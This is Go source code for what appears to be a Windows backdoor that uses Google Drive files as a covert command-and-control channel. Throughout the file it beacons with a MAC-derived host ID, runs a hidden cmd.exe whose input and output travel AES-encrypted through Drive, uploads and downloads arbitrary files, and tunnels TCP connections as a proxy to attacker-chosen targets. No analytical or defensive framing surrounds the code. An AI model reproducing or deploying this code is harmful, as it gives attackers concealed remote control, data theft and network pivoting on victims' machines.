package main

import (
	"crypto/md5"
	//"encoding/json"
	"fmt"
	"time"
	"encoding/hex"
	"net"

	"google.golang.org/api/drive/v3"
	"io/ioutil"
	"bytes"
	"os/exec"
	"./toolkits"
	"github.com/op/go-logging"
	"os"
	"syscall"
	//"strings"
	"path/filepath"
	"strings"
	"path"
	"io"
	"golang.org/x/sys/windows"
)

var ver = "080704"
var key = "123456781234567812345678"
var log = logging.MustGetLogger("goserver")
var format = logging.MustStringFormatter(
	`%{time:15:04:05.000} %{shortfunc} > %{level:s} %{message}`,
)

func getLoaclMac() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		panic("Error : " + err.Error())
	}
	for _, inter := range interfaces {
		mac := inter.HardwareAddr //获取本机MAC地址
		if (inter.Flags & net.FlagUp) == net.FlagUp {
			if (inter.Flags & net.FlagLoopback) != net.FlagLoopback {
				//fmt.Printf("MAC = %s(%s)\r\n", mac, inter.Name)
				return string(mac)
			}
		}
	}

	return ""
}

func getClientId() string {
	clientId := getLoaclMac()
	h := md5.New()
	h.Write([]byte(clientId))
	cipherStr := h.Sum(nil)
	return hex.EncodeToString(cipherStr)
}

func initLive(srv *drive.Service, serverId string) error  {
	indexName := serverId + ".idx"
	queryString := fmt.Sprintf("name='%s'", indexName)
	r, err := srv.Files.List().Q(queryString).
		Fields("files(id)").Do()
	if err != nil {
		log.Error("Unable to retrieve files", err)
		return err
	}

	for _, i := range r.Files {
		// delete file
		srv.Files.Delete(i.Id).Do()
	}

	return nil
}

func liveReport(srv *drive.Service, serverId string) error  {
	indexName := serverId + ".idx"
	queryString := fmt.Sprintf("name='%s'", indexName)
	r, err := srv.Files.List().Q(queryString).
		Fields("files(id, name, size)").Do()
	if err != nil {
		log.Error("Unable to retrieve files", err)
		return err
	}

	disp := fmt.Sprintf("%s(%s)", time.Now().Format("2006-01-02 15:04:05"), ver)
	if len(r.Files) == 0 {
		newFile := &drive.File{
			Name: indexName,
			MimeType: "application/octet-stream",
			Description: disp,
		}
		nf, _ := srv.Files.Create(newFile).Do()
		log.Debug("create", nf.Id)
	} else {
		for _, i := range r.Files {
			// clear file and update file time
			newFile := &drive.File{
				Description: disp,
			}
			nf, err := srv.Files.Update(i.Id, newFile).Do()
			if err != nil {
				log.Debug("update files error:", err)
			} else {
				log.Debug("update", nf.Id)
			}
		}
	}

	return nil
}

func socketRecv(srv *drive.Service, fileId string, src io.Reader)  {
	// 循环等待命令数据
	for {
		log.Debug("begin read")
		buf := make([]byte, 10240)
		n, err := src.Read(buf)
		if err != nil {
			log.Debug("read error")
			break
		}
		log.Debug("read", n, "byte(s)")
		if n == 0 {
			break
		}
		tempMedia := bytes.NewBuffer(nil)
		tempMedia.Write(buf[:n])
		sendData := toolkits.AesEncrypt(tempMedia.Bytes(), toolkits.MessageKey)
		sendMedia := bytes.NewBuffer(sendData)

		// 等待上一次数据被清除
		for {
			media, err := srv.Files.Get(fileId).Fields("size").Do()
			if err != nil {
				//println(err.Error())
				return
			}
			if media.Size == 0 {
				break
			}
			time.Sleep(time.Duration(1) * time.Second)
		}

		// 提交新数据
		srv.Files.Update(fileId, nil).Media(sendMedia).Do()
	}

}

func socksCreate(srv *drive.Service, fileId string)  {
	var target net.Conn
	var socketName string
	var outputId string
	//closeCh := make(chan int)

	// 循环等待命令数据
	for {
		timeout := time.NewTicker(time.Second)
		select {
		case <- timeout.C:
			//log.Debug("timeout")
		//case <- closeCh:
		//	log.Debug("abort")
		//	return
		}
		// 等待数据
		media, err:= srv.Files.Get(fileId).Fields("size, name, appProperties").Do()
		if err != nil {
			//println(err.Error())
			return
		}
		if media.Size == 0 {
			//time.Sleep(time.Duration(1)*time.Second)
			continue
		}
		log.Debug("size", media.Size)

		// 读取数据
		response, err := srv.Files.Get(fileId).Download()
		if err != nil {
			log.Error("Download error:", err)
			return
		}
		content, _ := ioutil.ReadAll(response.Body)
		response.Body.Close()
		recvData := toolkits.AesDecrypt(content, key)
		if media.AppProperties["typ"] == "s01" {
			// 连接目标
			//log.Debug("connect to", string(recvData))
			//target, err = net.Dial("tcp", string(recvData))
			tcpAddr, _ := net.ResolveTCPAddr("tcp4", string(recvData))
			target, err = net.DialTCP("tcp", nil, tcpAddr)
			if err != nil {
				srv.Files.Delete(fileId).Do()
				return
			}

			// 解析名称
			filenameWithSuffix := path.Base(filepath.Base(media.Name))
			filenameSuffix := path.Ext(filenameWithSuffix)
			socketName = strings.TrimSuffix(filenameWithSuffix, filenameSuffix)

			// 创建一个保存接收数据的文件
			localAddr := target.LocalAddr().String()
			log.Debug("local bind", localAddr)
			newFile := &drive.File{
				Name: socketName + ".output",
				MimeType: "application/octet-stream",
				AppProperties: map[string]string{
					"typ":	"s00",
				},
			}

			// create output pipe
			nf, _ := srv.Files.Create(newFile).Do()
			outputId = nf.Id
			log.Debug("create output", outputId)

			// 启动数据接收线程
			go func() {
				// 读取管道
				socketRecv(srv, outputId, target)
				log.Debug("close socket")
				target.Close()
				//closeCh <- 1

				// 删除文件
				log.Debug("delete", outputId)
				err := srv.Files.Delete(outputId).Do()
				if err != nil {
					log.Debug("delete", outputId, err)
				}
				log.Debug("delete", fileId)
				err = srv.Files.Delete(fileId).Do()
				if err != nil {
					log.Debug("delete", fileId, err)
				}
			}()

			//defer target.Close()

		} else {
			// 将数据发送到socket
			log.Debug("send data")
			n, err := target.Write(recvData)
			if err != nil {
				log.Debug("send error", err.Error())
			} else {
				log.Debug("send", n, "byte(s)")
			}
		}

		// 更新发送数据文件
		newFile := &drive.File{
			Name: socketName + ".input",
			MimeType: "application/octet-stream",
			Description: outputId,		// 把回应的ID放到这个字段
			AppProperties: map[string]string{
				"typ":	outputId,
			},
		}
		messageMedia := bytes.NewBuffer(nil)
		srv.Files.Update(fileId, newFile).Media(messageMedia).Do()
	}
}

func socksMain(srv *drive.Service, serverId string) error  {
	//log.Debug("query proxy request")
	indexName := serverId + ".socket"
	queryString := fmt.Sprintf("name='%s'", indexName)
	r, err := srv.Files.List().Q(queryString).
		Fields("files(id, name, size)").Do()
	if err != nil {
		log.Error("Unable to retrieve files", err)
		return err
	}

	for _, i := range r.Files {
		log.Debug("proxy on", i.Id)
		go socksCreate(srv, i.Id)
		//socksCreate(srv, i.Id)
	}

	return nil
}

func getFile(filename string) ([]byte, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	fileData, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, err
	}

	return fileData, err
}

func execMessage(srv *drive.Service, inputId string, outputId string) error {
	//log.Debug("exec message", inputId)
	cmdShell := exec.Command("cmd.exe")
	cmdShell.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
		CreationFlags: windows.STARTF_USESTDHANDLES,
	}

	ppReader, err := cmdShell.StdoutPipe()
	defer ppReader.Close()
	if err != nil {
		log.Debug("create read pipe error", err.Error())
	}

	ppWriter, err := cmdShell.StdinPipe()
	defer ppWriter.Close()
	if err != nil {
		log.Debug("create write pipe error", err.Error())
	}

	if err := cmdShell.Start(); err != nil {
		return err
	}

	// pipeReader
	go func() {
		buffer := make([]byte, 10240)

		for {
			// 从管道读取数据
			n, err := ppReader.Read(buffer)
			if err != nil {
				if err == io.EOF {
					log.Debug("pipi has closed")
					break
				} else {
					log.Debug("read content failed")
				}
			}

			// 加密数据
			sendData := toolkits.AesEncrypt(buffer[:n], toolkits.MessageKey)
			messageMedia := bytes.NewBuffer(sendData)

			// 等待文件清空
			for  {
				timeout := time.NewTicker(time.Second)
				select {
				case <-timeout.C:
					//case <- abortCh:
					//	return
				}

				media, err := srv.Files.Get(outputId).Fields("id, size").Do()
				if err != nil {
					log.Debug("get error")
					return
				}
				//log.Debug("check file size", media.Id, media.Size)
				if media.Size == 0 {
					break
				}
			}

			// 更新数据文件
			//log.Debug("write to pipe")
			srv.Files.Update(outputId, nil).Media(messageMedia).Do()
		}

	}()

	// pipeWriter
	go func() {
		for {
			var media *drive.File
			var err error

			// 等待数据文件
			for  {
				timeout := time.NewTicker(time.Second)
				select {
				case <-timeout.C:
					//case <- abortCh:
					//	return
				}

				media, err = srv.Files.Get(inputId).Fields("id, size, appProperties").Do()
				if err != nil {
					log.Debug("get error")
					return
				}
				//log.Debug("check input", media.Id, media.Size, media.AppProperties["typ"])
				if media.Size > 0 {
					break
				}
			}

			// 读取数据
			response, err := srv.Files.Get(inputId).Download()
			if err != nil {
				println("Download error:", err)
				return
			}
			content, _ := ioutil.ReadAll(response.Body)
			response.Body.Close()
			recvData := toolkits.AesDecrypt(content, toolkits.MessageKey)

			if media.AppProperties["typ"] == "put" {
				// put文件
				OriginalFilename := media.AppProperties["file"]
				file, err := os.OpenFile(OriginalFilename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0666)
				responseMessage := "put " + OriginalFilename
				if err != nil {
					responseMessage = err.Error()
				} else {
					file.Write(recvData)
					file.Close()
					responseMessage += " ok"
				}

				// 加密数据
				sendData := toolkits.AesEncrypt([]byte(responseMessage), toolkits.MessageKey)
				messageMedia := bytes.NewBuffer(sendData)

				// 回复信息
				srv.Files.Update(outputId, nil).Media(messageMedia).Do()
			} else if media.AppProperties["typ"] == "get" {
				// get文件
				OriginalFilename := media.AppProperties["file"]

				// 加密数据
				fileData, err := getFile(OriginalFilename)
				if err != nil {
					sendData := toolkits.AesEncrypt([]byte(err.Error()), toolkits.MessageKey)
					messageMedia := bytes.NewBuffer(sendData)

					// 回复信息
					srv.Files.Update(outputId, nil).Media(messageMedia).Do()
				} else {
					sendData := toolkits.AesEncrypt(fileData, toolkits.MessageKey)
					messageMedia := bytes.NewBuffer(sendData)

					// 提交文件
					newFile := &drive.File{
						AppProperties: map[string]string{
							"typ":	"get",
							"file":	OriginalFilename,
						},
					}
					srv.Files.Update(outputId, newFile).Media(messageMedia).Do()
				}
			} else {
				// 写入管道
				ppWriter.Write(recvData)
			}

			// 清空数据文件
			newFile := &drive.File{
				AppProperties: map[string]string{
					"typ":	"sh",
				},
			}
			messageMedia := bytes.NewBuffer(nil)
			srv.Files.Update(inputId, newFile).Media(messageMedia).Do()
		}
	}()

	time.Sleep(time.Duration(6)*time.Hour)
	return err
}

func messageMain(srv *drive.Service, serverId string) error  {
	//log.Debug("query message request")
	queryString := fmt.Sprintf("name='%s.smd'", serverId)
	r, err := srv.Files.List().Q(queryString).
		Fields("files(id, name, originalFilename, appProperties)").Do()
	if err != nil {
		log.Error("Unable to retrieve files", err)
		return err
	}

	for _, i := range r.Files {
		fileId		:= i.Id
		cmdType 	:= i.AppProperties["typ"]

		//log.Debug("file id", fileId)
		//log.Debug("file name", i.Name)

		// create output file
		newFile := &drive.File{
			Name: serverId + ".odd",
			MimeType: "application/octet-stream",
		}
		nf, err := srv.Files.Create(newFile).Do()
		if err != nil {
			log.Debug("create error")
			srv.Files.Delete(fileId).Do()
			continue
		}
		outputId := nf.Id

		// change input file
		newFile = &drive.File{
			Name: serverId + ".idd",
			MimeType: "application/octet-stream",
			Description: outputId,		// 把回应的ID放到这个字段
		}
		messageMedia := bytes.NewBuffer(nil)
		srv.Files.Update(fileId, newFile).Media(messageMedia).Do()

		if cmdType == "sh" {
			go execMessage(srv, fileId, outputId)
		}
	}

	return nil
}

func main() {
	// 获取主机ID
	serverId := getClientId()

	// init log config
	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
	backend2Formatter := logging.NewBackendFormatter(backend2, format)
	logging.SetBackend(backend2Formatter)

	// 登录Google
	srv, err := toolkits.LoginDrive()
	if err != nil{
		log.Error(err)
		os.Exit(0)
	}
	//log.Debug("Login OK")
	//log.Debug("server id:", serverId)
	//log.Debug("live report")
	go func() {
		initLive(srv, serverId)
		for {
			liveReport(srv, serverId)
			time.Sleep(time.Duration(1)*time.Minute)
		}
	}()

	// socks proxy
	//go func() {
	//	for {
	//		indexName := serverId + ".socket"
	//		queryString := fmt.Sprintf("name='%s'", indexName)
	//		r, err := srv.Files.List().Q(queryString).
	//			Fields("files(id, name, size)").Do()
	//		if err != nil {
	//			log.Error("Unable to retrieve files", err)
	//			break
	//		}
	//
	//		for _, i := range r.Files {
	//			log.Debug("proxy on", i.Id)
	//			//go socksCreate(srv, i.Id)
	//			socksCreate(srv, i.Id)
	//		}
	//		time.Sleep(time.Duration(3)*time.Second)
	//	}
	//
	//	os.Exit(0)
	//}()


	// 读取消息
	for {
		messageMain(srv, serverId)
		time.Sleep(time.Duration(6)*time.Second)
	}
}